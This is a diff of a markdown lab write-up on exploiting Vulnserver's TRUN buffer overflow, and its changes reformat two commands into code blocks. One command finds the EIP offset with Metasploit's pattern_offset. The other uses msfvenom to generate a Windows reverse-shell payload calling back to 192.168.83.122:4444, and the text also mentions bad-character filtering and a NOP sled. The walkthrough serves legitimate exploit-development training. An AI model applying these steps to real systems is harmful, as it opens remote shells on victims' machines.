@@ -70,7 +70,10 @@ Running the Vulnserver TRUN Pattern Python Script against the target system show
 ![trun-eip-overwrite-media-02 align="center"](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-02.png)
 
 EIP address is 386F4337. Use the Metasploit pattern offset utility to identify where the bytes are located in the 2500 byte buffer.
-	 > /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2500 -q 386F4337
+
+```bash
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2500 -q 386F4337
+```
 
 ![trun-eip-overwrite-media-03](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-03.png)
 
@@ -125,7 +128,9 @@ expl.close()
 ![trun-eip-overwrite-media-06](/screenshots/vulnserver/trun-eip-overwrite/trun-eip-overwrite-media-06.png)
 
 From looking at the output, we can tell that there are no bad characters other than \x00. Generate a reverse shell using msfvenom and insert it into the Vulnserver TRUN Python Script and proceed it with a 15 character NOP sled.
-	> msfvenom -p windows/shell_reverse_tcp LHOST=192.168.83.122 LPORT=4444 -b "\x00" -f c
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.83.122 LPORT=4444 -b "\x00" -f c
+```
 
 ```py
 #!/usr/bin/python
